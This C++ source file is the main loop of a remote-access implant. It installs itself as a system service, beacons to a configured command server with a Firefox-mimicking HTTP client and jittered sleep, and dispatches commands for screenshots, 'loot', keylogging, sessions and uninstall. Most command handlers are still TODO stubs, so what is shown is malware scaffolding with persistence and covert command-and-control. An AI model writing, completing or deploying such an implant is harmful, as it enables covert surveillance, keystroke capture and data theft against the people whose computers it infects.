#include <HttpUtils.hpp>
#include <RESTClient.hpp>
#include <cpppwn.hpp>
#include <SQLiteCpp/SQLiteCpp.h>
#include <vector>

#include "CommandDAO.hpp"
#include "Installer.hpp"
#include "Config.hpp"
#include "Types.hpp"
#include "Implant.hpp"

int main(int argc, char* argv[]) {
    bool is_installation = false;

    // parse arguments
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--install") {
            is_installation = true;
            break;
        }
    }

    // Installation
    if (is_installation) {
        if (installSystemService(config.service_name, config.service_desc)) {
            return 0; // everything went fine!
        } else {
            return 1; // installation not successful! Probably missing permissions
        }
    }

    // If we are not in Installation mode
    const auto& browser_config = HttpConfig(BrowserType::Firefox);
    cpppwn::RESTClient rest_client(config.server_url, browser_config);
    rest_client.set_auth_basic(config.username, config.password);

    const auto default_sleep = std::atol(config.default_timeout);
    auto sleep_time = default_sleep;

    // Command Execution Loop
    std::vector<CommandDAO> command_list;
    for(;;) {
        do {
            std::this_thread::sleep_for(std::chrono::minutes(sleep_time));
            sleep_time += (generate_nonce() % default_sleep);
            command_list = sendBeacon(rest_client);
        } while (command_list.empty());
        sleep_time = default_sleep;

        for(const auto& cmd : command_list) {
            if (cmd.command.starts_with("timeout")) {
                //TODO: parse and execute timeout command
            } else if (cmd.command.starts_with("session")) {
                //TODO: parse and execute open session command
            } else if (cmd.command.starts_with("close")) {
                //TODO: parse and execute close all connection command
            } else if (cmd.command.starts_with("screenshot")) {
                //TODO: parse and execute screenshot command
            } else if (cmd.command.starts_with("loot")) {
                //TODO: parse and execute loot command
            } else if (cmd.command.starts_with("keylogger_start")) {
                //TODO: parse and execute start keylogger command
            } else if (cmd.command.starts_with("keylogger_stop")) {
                //TODO: parse and execute stop keylogger command
            } else if (cmd.command.starts_with("uninstall")) {
                //TODO: parse and execute uninstall command
            }
        }
        command_list.clear();
    }

    return 0;
}